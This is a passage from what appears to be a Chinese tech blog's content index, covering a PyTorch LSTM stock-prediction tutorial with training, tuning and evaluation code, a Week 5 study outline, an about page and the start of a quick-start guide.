seq_len, target_idx=0):\n    X, y = [], []\n    for i in range(len(data) - seq_len):\n        X.append(data[i:i+seq_len])\n        y.append(data[i+seq_len, target_idx])\n    return np.array(X), np.array(y)\n \nseq_len = 20\nX, y = create_sequences(data_scaled, seq_len)\n \n# 划分数据\ntrain_size = int(0.7 * len(X))\nval_size = int(0.15 * len(X))\n \nX_train, X_val, X_test = X[:train_size], X[train_size:train_size+val_size], X[train_size+val_size:]\ny_train, y_val, y_test = y[:train_size], y[train_size:train_size+val_size], y[train_size+val_size:]\n \nprint(f&quot;Train: {X_train.shape}&quot;)\nprint(f&quot;Val: {X_val.shape}&quot;)\nprint(f&quot;Test: {X_test.shape}&quot;)\n步骤2: 模型定义\nimport torch\nimport torch.nn as nn\n \nclass StockPredictionLSTM(nn.Module):\n    def __init__(self, input_size, hidden_size, num_layers, dropout):\n        super().__init__()\n        self.lstm = nn.LSTM(\n            input_size=input_size,\n            hidden_size=hidden_size,\n            num_layers=num_layers,\n            batch_first=True,\n            dropout=dropout if num_layers &gt; 1 else 0\n        )\n        self.dropout = nn.Dropout(dropout)\n        self.fc = nn.Linear(hidden_size, 1)\n \n    def forward(self, x):\n        lstm_out, _ = self.lstm(x)\n        last_output = lstm_out[:, -1, :]\n        last_output = self.dropout(last_output)\n        output = self.fc(last_output)\n        return output\n \n# 创建模型\nmodel = StockPredictionLSTM(\n    input_size=X_train.shape[2],\n    hidden_size=64,\n    num_layers=2,\n    dropout=0.2\n)\n步骤3: Dataset和DataLoader\nfrom torch.utils.data import Dataset, DataLoader\n \nclass StockDataset(Dataset):\n    def __init__(self, X, y):\n        self.X = torch.FloatTensor(X)\n        self.y = torch.FloatTensor(y)\n \n    def __len__(self):\n        return len(self.X)\n \n    def __getitem__(self, idx):\n        return self.X[idx], self.y[idx]\n \n# 创建Dataset和DataLoader\ntrain_dataset = StockDataset(X_train, y_train)\nval_dataset = StockDataset(X_val, y_val)\ntest_dataset = StockDataset(X_test, y_test)\n \ntrain_loader = DataLoader(train_dataset, batch_size=32, shuffle=True)\nval_loader = DataLoader(val_dataset, batch_size=32, shuffle=False)\ntest_loader = DataLoader(test_dataset, batch_size=32, shuffle=False)\n步骤4: 训练\nimport copy\n \n# 定义损失函数和优化器\ncriterion = nn.MSELoss()\noptimizer = torch.optim.Adam(model.parameters(), lr=0.001)\n \n# 训练\nnum_epochs = 50\nbest_val_loss = float(&#039;inf&#039;)\nbest_model = None\n \nfor epoch in range(num_epochs):\n    # 训练\n    model.train()\n    train_loss = 0.0\n    for X_batch, y_batch in train_loader:\n        optimizer.zero_grad()\n        predictions = model(X_batch)\n        loss = criterion(predictions.squeeze(), y_batch)\n        loss.backward()\n        torch.nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0)\n        optimizer.step()\n        train_loss += loss.item()\n \n    train_loss /= len(train_loader)\n \n    # 验证\n    model.eval()\n    val_loss = 0.0\n    with torch.no_grad():\n        for X_batch, y_batch in val_loader:\n            predictions = model(X_batch)\n            loss = criterion(predictions.squeeze(), y_batch)\n            val_loss += loss.item()\n \n    val_loss /= len(val_loader)\n \n    print(f&quot;Epoch {epoch+1}, Train Loss: {train_loss:.4f}, Val Loss: {val_loss:.4f}&quot;)\n \n    # 保存最佳模型\n    if val_loss &lt; best_val_loss:\n        best_val_loss = val_loss\n        best_model = copy.deepcopy(model.state_dict())\n \n# 加载最佳模型\nmodel.load_state_dict(best_model)\n步骤5: 评估\n# 测试\nmodel.eval()\npredictions = []\nactuals = []\n \nwith torch.no_grad():\n    for X_batch, y_batch in test_loader:\n        pred = model(X_batch)\n        predictions.extend(pred.squeeze().numpy())\n        actuals.extend(y_batch.numpy())\n \n# 反标准化\npredictions = scaler.inverse_transform(\n    np.column_stack([predictions, np.zeros((len(predictions), X_train.shape[2]-1))])\n)[:, 0]\n \nactuals = scaler.inverse_transform(\n    np.column_stack([actuals, np.zeros((len(actuals), X_train.shape[2]-1))])\n)[:, 0]\n \n# 计算指标\nfrom sklearn.metrics import mean_squared_error, mean_absolute_error, r2_score\n \nmse = mean_squared_error(actuals, predictions)\nmae = mean_absolute_error(actuals, predictions)\nr2 = r2_score(actuals, predictions)\n \nprint(f&quot;MSE: {mse:.4f}&quot;)\nprint(f&quot;MAE: {mae:.4f}&quot;)\nprint(f&quot;R²: {r2:.4f}&quot;)\n\n超参数调优\n网格搜索\nfrom itertools import product\n \n# 定义参数网格\nparam_grid = {\n    &#039;hidden_size&#039;: [32, 64, 128],\n    &#039;num_layers&#039;: [1, 2, 3],\n    &#039;dropout&#039;: [0.1, 0.2, 0.3],\n    &#039;learning_rate&#039;: [0.0001, 0.001, 0.01],\n    &#039;batch_size&#039;: [16, 32, 64]\n}\n \n# 生成所有参数组合\nparam_combinations = list(product(\n    param_grid[&#039;hidden_size&#039;],\n    param_grid[&#039;num_layers&#039;],\n    param_grid[&#039;dropout&#039;],\n    param_grid[&#039;learning_rate&#039;],\n    param_grid[&#039;batch_size&#039;]\n))\n \nbest_params = None\nbest_val_loss = float(&#039;inf&#039;)\n \nfor hidden_size, num_layers, dropout, lr, batch_size in param_combinations:\n    print(f&quot;Testing: hidden_size={hidden_size}, num_layers={num_layers}, dropout={dropout}, lr={lr}, batch_size={batch_size}&quot;)\n \n    # 创建模型\n    model = StockPredictionLSTM(\n        input_size=X_train.shape[2],\n        hidden_size=hidden_size,\n        num_layers=num_layers,\n        dropout=dropout\n    )\n \n    # 创建DataLoader\n    train_loader = DataLoader(train_dataset, batch_size=batch_size, shuffle=True)\n    val_loader = DataLoader(val_dataset, batch_size=batch_size, shuffle=False)\n \n    # 定义优化器\n    criterion = nn.MSELoss()\n    optimizer = torch.optim.Adam(model.parameters(), lr=lr)\n \n    # 训练（快速验证）\n    for epoch in range(10):\n        model.train()\n        for X_batch, y_batch in train_loader:\n            optimizer.zero_grad()\n            predictions = model(X_batch)\n            loss = criterion(predictions.squeeze(), y_batch)\n            loss.backward()\n            optimizer.step()\n \n    # 验证\n    model.eval()\n    val_loss = 0.0\n    with torch.no_grad():\n        for X_batch, y_batch in val_loader:\n            predictions = model(X_batch)\n            loss = criterion(predictions.squeeze(), y_batch)\n            val_loss += loss.item()\n \n    val_loss /= len(val_loader)\n \n    print(f&quot;  Val Loss: {val_loss:.4f}&quot;)\n \n    # 更新最佳参数\n    if val_loss &lt; best_val_loss:\n        best_val_loss = val_loss\n        best_params = {\n            &#039;hidden_size&#039;: hidden_size,\n            &#039;num_layers&#039;: num_layers,\n            &#039;dropout&#039;: dropout,\n            &#039;learning_rate&#039;: lr,\n            &#039;batch_size&#039;: batch_size\n        }\n \nprint(f&quot;\\nBest parameters: {best_params}&quot;)\nprint(f&quot;Best validation loss: {best_val_loss:.4f}&quot;)\n随机搜索\nimport random\n \nn_trials = 50\n \nfor trial in range(n_trials):\n    # 随机选择参数\n    hidden_size = random.choice([32, 64, 128, 256])\n    num_layers = random.choice([1, 2, 3, 4])\n    dropout = random.uniform(0.1, 0.5)\n    learning_rate = random.choice([0.0001, 0.001, 0.01])\n    batch_size = random.choice([16, 32, 64, 128])\n \n    print(f&quot;Trial {trial+1}/{n_trials}&quot;)\n \n    # 训练和验证\n    # ...\n\n模型保存与加载\n保存模型\n# 1. 保存整个模型（包含结构和参数）\ntorch.save(model, &#039;lstm_model.pth&#039;)\n \n# 2. 只保存模型参数（推荐）\ntorch.save(model.state_dict(), &#039;lstm_model_state.pth&#039;)\n \n# 3. 保存检查点（包含优化器状态）\ncheckpoint = {\n    &#039;epoch&#039;: epoch,\n    &#039;model_state_dict&#039;: model.state_dict(),\n    &#039;optimizer_state_dict&#039;: optimizer.state_dict(),\n    &#039;loss&#039;: loss,\n    &#039;best_val_loss&#039;: best_val_loss\n}\ntorch.save(checkpoint, &#039;checkpoint.pth&#039;)\n加载模型\n# 1. 加载整个模型\nmodel = torch.load(&#039;lstm_model.pth&#039;)\nmodel.eval()  # 设置为评估模式\n \n# 2. 加载模型参数（需要先定义模型）\nmodel = StockPredictionLSTM(\n    input_size=X_train.shape[2],\n    hidden_size=64,\n    num_layers=2,\n    dropout=0.2\n)\nmodel.load_state_dict(torch.load(&#039;lstm_model_state.pth&#039;))\nmodel.eval()\n \n# 3. 加载检查点\ncheckpoint = torch.load(&#039;checkpoint.pth&#039;)\nmodel.load_state_dict(checkpoint[&#039;model_state_dict&#039;])\noptimizer.load_state_dict(checkpoint[&#039;optimizer_state_dict&#039;])\nepoch = checkpoint[&#039;epoch&#039;]\nloss = checkpoint[&#039;loss&#039;]\nbest_val_loss = checkpoint[&#039;best_val_loss&#039;]\n最佳实践\n# 训练时保存最佳模型\nbest_val_loss = float(&#039;inf&#039;)\n \nfor epoch in range(num_epochs):\n    # 训练和验证\n    val_loss = validate(model, val_loader)\n \n    # 保存最佳模型\n    if val_loss &lt; best_val_loss:\n        best_val_loss = val_loss\n        torch.save(model.state_dict(), &#039;best_model.pth&#039;)\n        print(f&quot;Saved best model with val_loss: {val_loss:.4f}&quot;)\n \n    # 定期保存检查点\n    if (epoch + 1) % 10 == 0:\n        checkpoint = {\n            &#039;epoch&#039;: epoch,\n            &#039;model_state_dict&#039;: model.state_dict(),\n            &#039;optimizer_state_dict&#039;: optimizer.state_dict(),\n            &#039;best_val_loss&#039;: best_val_loss\n        }\n        torch.save(checkpoint, f&#039;checkpoint_epoch_{epoch+1}.pth&#039;)\n\n评估指标\n回归指标\n1. MSE（均方误差）\nmse = torch.mean((predictions - targets) ** 2)\nprint(f&quot;MSE: {mse.item():.4f}&quot;)\n2. MAE（平均绝对误差）\nmae = torch.mean(torch.abs(predictions - targets))\nprint(f&quot;MAE: {mae.item():.4f}&quot;)\n3. RMSE（均方根误差）\nrmse = torch.sqrt(torch.mean((predictions - targets) ** 2))\nprint(f&quot;RMSE: {rmse.item():.4f}&quot;)\n4. R²（决定系数）\nss_res = torch.sum((targets - predictions) ** 2)\nss_tot = torch.sum((targets - torch.mean(targets)) ** 2)\nr2 = 1 - ss_res / ss_tot\nprint(f&quot;R²: {r2.item():.4f}&quot;)\n量化投资专用指标\n1. IC（信息系数）\nfrom scipy.stats import spearmanr\n \nic, _ = spearmanr(predictions.numpy(), targets.numpy())\nprint(f&quot;IC: {ic:.4f}&quot;)\n2. ICIR（信息系数信息比率）\n# 计算多期IC\nic_values = []\nfor i in range(n_periods):\n    ic, _ = spearmanr(preds[i], targets[i])\n    ic_values.append(ic)\n \nicir = np.mean(ic_values) / np.std(ic_values)\nprint(f&quot;ICIR: {icir:.4f}&quot;)\n3. MAPE（平均绝对百分比误差）\nmape = torch.mean(torch.abs((targets - predictions) / targets)) * 100\nprint(f&quot;MAPE: {mape.item():.2f}%&quot;)\n完整评估\ndef evaluate_model(model, test_loader, scaler):\n    &quot;&quot;&quot;\n    评估模型\n \n    参数:\n        model: 模型\n        test_loader: 测试数据加载器\n        scaler: 标准化器\n \n    返回:\n        评估结果字典\n    &quot;&quot;&quot;\n    model.eval()\n    predictions = []\n    actuals = []\n \n    with torch.no_grad():\n        for X_batch, y_batch in test_loader:\n            pred = model(X_batch)\n            predictions.extend(pred.squeeze().numpy())\n            actuals.extend(y_batch.numpy())\n \n    predictions = np.array(predictions)\n    actuals = np.array(actuals)\n \n    # 反标准化\n    predictions_original = scaler.inverse_transform(\n        np.column_stack([predictions, np.zeros((len(predictions), X_train.shape[2]-1))])\n    )[:, 0]\n \n    actuals_original = scaler.inverse_transform(\n        np.column_stack([actuals, np.zeros((len(actuals), X_train.shape[2]-1))])\n    )[:, 0]\n \n    # 计算指标\n    from sklearn.metrics import mean_squared_error, mean_absolute_error, r2_score\n    from scipy.stats import spearmanr\n \n    results = {\n        &#039;MSE&#039;: mean_squared_error(actuals_original, predictions_original),\n        &#039;MAE&#039;: mean_absolute_error(actuals_original, predictions_original),\n        &#039;RMSE&#039;: np.sqrt(mean_squared_error(actuals_original, predictions_original)),\n        &#039;R²&#039;: r2_score(actuals_original, predictions_original),\n        &#039;IC&#039;: spearmanr(predictions_original, actuals_original)[0],\n        &#039;MAPE&#039;: np.mean(np.abs((actuals_original - predictions_original) / actuals_original)) * 100\n    }\n \n    return results, predictions_original, actuals_original\n \n# 评估\nresults, preds, actuals = evaluate_model(model, test_loader, scaler)\n \nfor metric, value in results.items():\n    print(f&quot;{metric}: {value:.4f}&quot;)\n\nLSTM vs LightGBM\n对比维度\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n维度LSTMLightGBM数据需求大量中等训练时间长短特征工程少多可解释性低高长期依赖优秀差过拟合风险高中推理速度中快GPU支持✅❌学习曲线慢快\n性能对比实验\n# LSTM模型\nlstm_model = StockPredictionLSTM(\n    input_size=X_train.shape[2],\n    hidden_size=64,\n    num_layers=2,\n    dropout=0.2\n)\n \n# 训练LSTM\ncriterion = nn.MSELoss()\noptimizer = torch.optim.Adam(lstm_model.parameters(), lr=0.001)\n \nfor epoch in range(50):\n    lstm_model.train()\n    for X_batch, y_batch in train_loader:\n        optimizer.zero_grad()\n        predictions = lstm_model(X_batch)\n        loss = criterion(predictions.squeeze(), y_batch)\n        loss.backward()\n        optimizer.step()\n \n# LightGBM模型\nimport lightgbm as lgb\n \n# 展平数据\nX_train_flat = X_train.reshape(X_train.shape[0], -1)\nX_test_flat = X_test.reshape(X_test.shape[0], -1)\n \n# 训练\nlgb_model = lgb.LGBMRegressor(\n    n_estimators=100,\n    learning_rate=0.1,\n    max_depth=6\n)\nlgb_model.fit(X_train_flat, y_train)\n \n# 预测\nlstm_preds = lstm_model(torch.FloatTensor(X_test)).squeeze().numpy()\nlgb_preds = lgb_model.predict(X_test_flat)\n \n# 对比\nlstm_mse = np.mean((lstm_preds - y_test) ** 2)\nlgb_mse = np.mean((lgb_preds - y_test) ** 2)\n \nprint(f&quot;LSTM MSE: {lstm_mse:.4f}&quot;)\nprint(f&quot;LightGBM MSE: {lgb_mse:.4f}&quot;)\n选择建议\n选择LSTM:\n\n数据量大\n长期依赖重要\n特征工程少\n需要捕捉复杂模式\n\n选择LightGBM:\n\n数据量中等\n需要快速迭代\n可解释性重要\n计算资源有限\n\n\n最佳实践\n数据准备\n1. 数据质量检查\n# 检查缺失值\nprint(data.isnull().sum())\n \n# 检查异常值\nprint(data.describe())\n \n# 处理缺失值\ndata = data.fillna(method=&#039;ffill&#039;)\n2. 特征选择\n# 选择与目标相关的特征\nfrom sklearn.feature_selection import SelectKBest, f_regression\n \nselector = SelectKBest(f_regression, k=10)\nX_selected = selector.fit_transform(X, y)\n3. 时间序列划分\n# 严格按时间顺序划分\n# 避免未来函数\n# 保留样本外数据\n模型设计\n1. 模型复杂度\n# 从简单模型开始\n# 逐步增加复杂度\n# 避免过度复杂\n2. 超参数选择\n# hidden_size: 32-128\n# num_layers: 1-3\n# dropout: 0.1-0.3\n# learning_rate: 0.0001-0.01\n3. 正则化\n# 使用Dropout防止过拟合\n# 使用BatchNorm加速训练\n# 使用L1/L2正则化\n训练策略\n1. 早停\n# 监控验证集损失\n# 防止过拟合\n# 节省训练时间\n2. 学习率调度\n# 初始学习率较大\n# 逐渐降低学习率\n# 使用学习率衰减\n3. 梯度裁剪\n# 防止梯度爆炸\n# 稳定训练过程\ntorch.nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0)\n评估与验证\n1. 多指标评估\n# 不要只看一个指标\n# 综合考虑多个指标\n# 关注风险调整收益\n2. 样本外验证\n# 保留一部分数据不参与训练\n# 严格验证泛化能力\n# 避免过拟合\n3. 稳定性测试\n# 在不同时间段测试\n# 检查参数稳定性\n# 验证鲁棒性\n常见问题\nQ1: LSTM过拟合怎么办？\nA: 多种方法结合:\n\n增加Dropout比例\n减少模型复杂度\n增加训练数据\n使用更强的正则化\n\nQ2: LSTM训练很慢怎么办？\nA: 优化训练速度:\n\n使用GPU\n减小batch_size\n减少模型复杂度\n使用更快的优化器\n\nQ3: LSTM vs LightGBM如何选择？\nA: 根据实际情况:\n\n数据量大、长期依赖重要：LSTM\n需要快速迭代、可解释性重要：LightGBM\n两者都试，选择更好的\n\nQ4: 如何确定序列长度？\nA: 通过实验确定:\n\n尝试不同的序列长度（10, 20, 30, 60）\n使用验证集选择最优长度\n考虑业务逻辑（如一周、一月）\n\n\n核心知识点总结\n完整预测流程\n\n✅ 数据准备\n✅ 模型定义\n✅ Dataset和DataLoader\n✅ 训练\n✅ 评估\n\n超参数调优\n\n✅ 网格搜索\n✅ 随机搜索\n✅ 贝叶斯优化\n\n模型保存与加载\n\n✅ 保存模型\n✅ 加载模型\n✅ 最佳实践\n\n评估指标\n\n✅ 回归指标\n✅ 量化投资指标\n✅ 完整评估\n\nLSTM vs LightGBM\n\n✅ 对比维度\n✅ 性能对比\n✅ 选择建议\n\n最佳实践\n\n✅ 数据准备\n✅ 模型设计\n✅ 训练策略\n✅ 评估验证\n\n\n附录\n专业术语表\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n术语英文解释RNNRecurrent Neural Network循环神经网络LSTMLong Short-Term Memory长短期记忆网络GRUGated Recurrent Unit门控循环单元ICInformation Coefficient信息系数ICIRIC Information Ratio信息系数信息比率Early Stopping早停防止过拟合的技术Dropout丢弃随机丢弃神经元\n推荐学习资源\n书籍:\n\n《深度学习》（Goodfellow等）\n《动手学深度学习》\n《Python深度学习》\n\n在线课程:\n\nCoursera: Deep Learning Specialization\nFast.ai: Practical Deep Learning for Coders\n\n文档和教程:\n\nPyTorch官方文档：pytorch.org/docs/\nPyTorch教程：pytorch.org/tutorials/\n\n\n系列文档结束\n祝学习顺利！🎓"},"quant/qlib/week5/index":{"slug":"quant/qlib/week5/index","filePath":"quant/qlib/week5/index.md","title":"index","links":["01_基础理论系列/","02_PyTorch框架系列/","03_LSTM模型构建系列/","04_时序数据处理系列/","05_模型训练优化系列/","06_实战应用系列/"],"tags":[],"content":"Week 5 LSTM深度学习模型 - 知识点体系\n📚 文档说明\n\n文档版本: v1.0\n创建日期: 2025-01-09\n学习主题: LSTM深度学习模型\n适用对象: Qlib量化投资学习者\n建议学习时间: 5-6小时（4-5天）\n\n\n📖 文档体系\n本文档采用分系列组织方式，将Week 5的知识点分为6个系列，每个系列聚焦一个核心主题。\n系列列表\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n系列说明文档路径1. 基础理论系列深度学习基础、RNN与LSTM原理01_基础理论系列2. PyTorch框架系列Tensor、Autograd、nn.Module、常用层02_PyTorch框架系列3. LSTM模型构建系列单层、多层、双向LSTM架构03_LSTM模型构建系列4. 时序数据处理系列滑动窗口、标准化、Dataset04_时序数据处理系列5. 模型训练优化系列损失函数、优化器、训练循环05_模型训练优化系列6. 实战应用系列完整流程、调优、评估06_实战应用系列\n\n🎯 学习路径\n推荐学习顺序\nStep 1: 基础理论系列\n   ↓\nStep 2: PyTorch框架系列\n   ↓\nStep 3: LSTM模型构建系列\n   ↓\nStep 4: 时序数据处理系列\n   ↓\nStep 5: 模型训练优化系列\n   ↓\nStep 6: 实战应用系列\n\n每日学习计划\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n天数学习内容预计时间Day 1基础理论系列 + PyTorch框架系列1.5-2小时Day 2LSTM模型构建系列1小时Day 3时序数据处理系列1小时Day 4模型训练优化系列1-1.5小时Day 5实战应用系列1.5小时\n\n📊 知识点概览\n1. 基础理论系列\n核心知识点:\n\n✅ 深度学习基础（神经元、激活函数、神经网络）\n✅ 序列数据特点\n✅ RNN原理与局限性（梯度消失）\n✅ LSTM原理（细胞状态、门机制）\n✅ LSTM vs RNN vs GRU对比\n\n关键概念:\n\n梯度消失问题\n细胞状态\n遗忘门、输入门、输出门\n长期依赖\n\n2. PyTorch框架系列\n核心知识点:\n\n✅ Tensor创建与操作\n✅ Autograd自动微分\n✅ nn.Module模型定义\n✅ 常用层（LSTM、Linear、Dropout）\n\n关键概念:\n\nrequires_grad\nbackward()\n计算图\nGPU加速\n\n3. LSTM模型构建系列\n核心知识点:\n\n✅ 单层LSTM\n✅ 多层LSTM\n✅ 双向LSTM\n✅ LSTM变体（堆叠、编码器-解码器、注意力）\n✅ 超参数选择\n\n关键概念:\n\nhidden_size\nnum_layers\ndropout\nbatch_first\nbidirectional\n\n4. 时序数据处理系列\n核心知识点:\n\n✅ 滑动窗口方法\n✅ 时间序列划分\n✅ 特征标准化（Z-score、Min-Max、RobustScaler）\n✅ PyTorch Dataset\n✅ DataLoader\n\n关键概念:\n\n序列长度（seq_len）\n训练/验证/测试集\n数据泄漏\n批处理\n\n5. 模型训练优化系列\n核心知识点:\n\n✅ 损失函数（MSE、MAE、Smooth L1）\n✅ 优化器（SGD、Adam、RMSprop）\n✅ 训练循环\n✅ 早停策略\n✅ 正则化（L1/L2、Dropout、BatchNorm）\n✅ 学习率调度\n\n关键概念:\n\n前向传播\n反向传播\n梯度裁剪\n过拟合\n学习率衰减\n\n6. 实战应用系列\n核心知识点:\n\n✅ 完整预测流程\n✅ 超参数调优（网格搜索、随机搜索）\n✅ 模型保存与加载\n✅ 评估指标（MSE、MAE、IC、ICIR）\n✅ LSTM vs LightGBM对比\n✅ 最佳实践\n\n关键概念:\n\n端到端流程\n模型持久化\n泛化能力\n样本外验证\n鲁棒性\n\n\n💡 学习建议\n1. 理论学习\n\n先理解RNN的局限性\n再学习LSTM的创新点\n掌握门机制的作用\n理解细胞状态的意义\n\n2. 实践练习\n\n从简单的单层LSTM开始\n逐步增加复杂度\n使用真实数据训练\n对比不同架构的性能\n\n3. 代码实现\n\n跟着文档实现代码\n理解每一步的作用\n尝试修改参数\n观察效果变化\n\n4. 问题解决\n\n遇到问题时先查看文档\n利用PyTorch官方文档\n搜索Stack Overflow\n在社区提问\n\n\n🔧 技能检查清单\n基础理论\n\n 理解深度学习基本概念\n 掌握序列数据特点\n 理解RNN的工作原理\n 知道RNN的局限性\n 掌握LSTM的架构\n 理解门机制的作用\n 知道LSTM vs GRU的区别\n\nPyTorch框架\n\n 能够创建和操作Tensor\n 理解自动微分原理\n 能够定义自定义模型\n 掌握常用层的使用\n 能够使用GPU加速\n\n模型构建\n\n 能够定义单层LSTM\n 能够定义多层LSTM\n 理解双向LSTM\n 知道如何选择超参数\n 了解LSTM变体\n\n数据处理\n\n 能够实现滑动窗口\n 能够划分时序数据\n 掌握特征标准化\n 能够创建Dataset\n 能够使用DataLoader\n\n训练优化\n\n 能够选择合适的损失函数\n 能够选择合适的优化器\n 能够实现完整的训练循环\n 能够使用早停策略\n 理解正则化方法\n 能够调整学习率\n\n实战应用\n\n 能够完成完整的预测流程\n 能够进行超参数调优\n 能够保存和加载模型\n 能够计算评估指标\n 理解LSTM vs LightGBM\n 掌握最佳实践\n\n\n📚 扩展阅读\n推荐书籍\n\n《深度学习》（Ian Goodfellow等）\n《动手学深度学习》（Dive into Deep Learning）\n《Python深度学习》（François Chollet）\n\n在线课程\n\nCoursera: Deep Learning Specialization\nFast.ai: Practical Deep Learning for Coders\nUdacity: Deep Learning Nanodegree\n\n论文\n\nHochreiter &amp; Schmidhuber (1997). Long Short-Term Memory\nCho et al. (2014). Learning Phrase Representations using RNN Encoder-Decoder\n\n官方文档\n\nPyTorch: pytorch.org/docs/\nPyTorch Tutorials: pytorch.org/tutorials/\n\n\n🎓 学习成果\n完成本系列学习后，您将能够：\n理论层面\n\n✅ 深入理解LSTM的工作原理\n✅ 掌握时序数据的处理方法\n✅ 理解深度学习的核心概念\n\n实践层面\n\n✅ 使用PyTorch构建LSTM模型\n✅ 训练和优化LSTM模型\n✅ 评估和对比模型性能\n\n应用层面\n\n✅ 将LSTM应用于量化投资\n✅ 进行股票价格预测\n✅ 提取时序特征\n\n\n📞 支持与反馈\n如有问题或建议，请通过以下方式联系：\n\nGitHub Issues: github.com/anomalyco/opencode/issues\n学习交流群: [待添加]\n\n\n祝学习顺利！🎓"},"关于":{"slug":"关于","filePath":"关于.md","title":"关于","links":["/","quant/qlib/","blockchain/"],"tags":[],"content":"title: 关于\n关于我\n\n热爱技术，分享知识，持续成长\n\n\n👤 个人简介\n我是一名热爱技术的开发者，专注于量化投资和区块链技术两个领域。我喜欢探索新技术，分享学习心得，记录成长历程。\n\n🎯 技术兴趣\n量化投资\n使用机器学习和深度学习技术进行量化分析和交易策略研究。\n\n特征工程: Qlib平台的应用与实践\n机器学习: LightGBM、XGBoost等模型\n深度学习: PyTorch、LSTM、Transformer\n回测系统: 策略评估与绩效分析\n\n区块链技术\n探索去中心化世界，从智能合约到DeFi应用。\n\n智能合约: Solidity开发与安全\nDeFi应用: 去中心化金融协议\nWeb3开发: DApp前端与区块链交互\nNFT市场: 数字资产与收藏品\n\n\n🛠️ 技术栈\n编程语言\n\n  Python\n  JavaScript\n  TypeScript\n  Go\n  Solidity\n\n框架与工具\n\n  PyTorch\n  Qlib\n  LightGBM\n  Ethers.js\n  Hardhat\n  React\n  Next.js\n\n\n📚 学习理念\n理论与实践并重\n\n深入理解理论知识\n大量动手实践\n解决实际问题\n\n持续学习\n\n紧跟技术发展\n保持好奇心\n分享学习心得\n\n开放交流\n\n参与技术社区\n分享知识经验\n与他人共同成长\n\n\n🎓 教育背景\n[待添加]\n\n💼 工作经历\n[待添加]\n\n📝 写作动机\n为什么写技术博客？\n\n巩固知识: 通过写作加深对知识的理解\n分享经验: 帮助他人少走弯路\n记录成长: 留下学习轨迹和思考过程\n建立影响力: 与更多人交流和学习\n\n写作原则\n\n原创性: 分享自己的理解和实践\n实用性: 提供可操作的代码和示例\n系统性: 构建完整的知识体系\n持续更新: 跟进技术发展和新的理解\n\n\n🚀 未来规划\n2025年计划\n量化投资\n\n Week 4 - 强化学习\n Week 6 - Transformer模型\n 高级回测技巧\n 多因子模型\n 端到端策略系统\n\n区块链\n\n 区块链基础系列\n 智能合约开发实战\n DeFi项目开发\n NFT市场构建\n Web3全栈开发\n\n技术博客\n\n 增加更多实战案例\n 优化文档结构\n 添加视频教程\n 建立读者社区\n\n\n🤝 交流与合作\n我欢迎各种形式的交流与合作！\n合作机会\n\n技术文章写作\n开源项目贡献\n技术分享演讲\n量化策略研究\n区块链项目开发\n\n联系方式\n\n📧 Email: [待添加]\n🐦 Twitter: [待添加]\n💻 GitHub: [待添加]\n💬 微信: [待添加]\n📱 LinkedIn: [待添加]\n\n\n🔗 链接\n量化投资\n\nQlib官方文档\nLightGBM官方文档\nPyTorch官方文档\n\n区块链\n\nEthereum.org\nSolidity文档\nOpenZeppelin\n\n技术社区\n\nQuantStart\nGitHub\nStack Overflow\n\n\n📄 许可证\n本博客内容采用 Creative Commons Attribution 4.0 International (CC BY 4.0) 许可证。\n您可以自由地：\n\n✅ 分享：复制和重新分发材料\n✅ 修改：改编、转换和基于材料构建\n\n但需要遵守以下条件：\n\n⚠️ 署名：必须提供适当的署名，提供指向许可证的链接，并说明是否进行了更改\n\n\n🙏 致谢\n感谢以下项目和社区：\n量化投资\n\nMicrosoft Research Asia（Qlib开发团队）\nLightGBM开发团队\nPyTorch团队\n\n区块链\n\nEthereum基金会\nSolidity团队\nOpenZeppelin团队\n\n开源社区\n\n所有开源项目的贡献者\n技术社区的每一位成员\n\n\n\n  🚀 让我们一起成长\n  在技术的道路上，我们并不孤单\n  \n    返回首页\n    量化学习\n    区块链\n  \n\n\n\n  Made with ❤️ by [你的名字]\n"},"快速开始":{"slug":"快速开始","filePath":"快速开始.md","title":"快速开始","links":["quant/qlib/week1/01-qlib特征工程全景概览","quant/qlib/week2/01-Gradient-Boosting原理","quant/qlib/week2/03-模型训练","quant/qlib/week2/02-时序数据划分","quant/qlib/week2/04-IC-Rank-IC评估指标","quant/qlib/week2/05-特征重要性分析","quant/qlib/week1/04-相对强弱预测的量化思维","quant/qlib/week1/05-qlib特征工程实践指南","quant/qlib/week3/01-交易策略理论","quant/qlib/week3/02-投资组合构建方法","/","quant/qlib/week1/","quant/qlib/week2/"],"tags":[],"content":"title: 快速开始\n快速开始指南\n本指南帮助你快速上手量化投资技术文档中的内容。\n\n🎯 我是新手，从哪里开始？\n第一步：了解基础概念\n如果你是量化投资的新手，建议按照以下顺序学习：\n\n\n特征工程基础\n\n阅读 Qlib特征工程全景概览\n了解量化数据的特点和挑战\n\n\n\n机器学习基础\n\n阅读 Gradient Boosting原理\n理解LightGBM的核心概念\n\n\n\n实践应用\n\n阅读 模型训练\n开始动手构建你的第一个模型\n\n\n\n\n📚 根据目标选择学习路径\n路径A：因子研究\n特征工程全景概览 → Horizon对齐详解 → 横截面标准化 → 相对强弱预测 → 实践指南\n\n适合人群：专注于因子研发和优化的研究员\n路径B：模型构建\nGradient Boosting原理 → 时序数据划分 → 模型训练 → IC评估指标 → 特征重要性分析\n\n适合人群：负责构建和优化预测模型的开发者\n路径C：量化交易\n相对强弱预测 → IC/Rank IC评估 → 模型训练实战 → 特征工程实践\n\n适合人群：希望将模型应用于实际交易的量化交易员\n\n🛠️ 准备工作\n环境配置\n# 安装Python依赖\npip install qlib lightgbm numpy pandas scikit-learn scipy\n \n# 安装可视化工具（可选）\npip install matplotlib seaborn shap\n数据准备\n\n确保有量化数据源（股票行情、财务数据等）\n推荐使用标准化的数据格式\n注意数据的时序性和因果性\n\n\n💻 快速示例\n示例1：训练一个简单的LightGBM模型\nimport lightgbm as lgb\nimport numpy as np\n \n# 准备数据\nX_train = np.random.randn(1000, 50)  # 1000个样本，50个特征\ny_train = np.random.randn(1000)       # 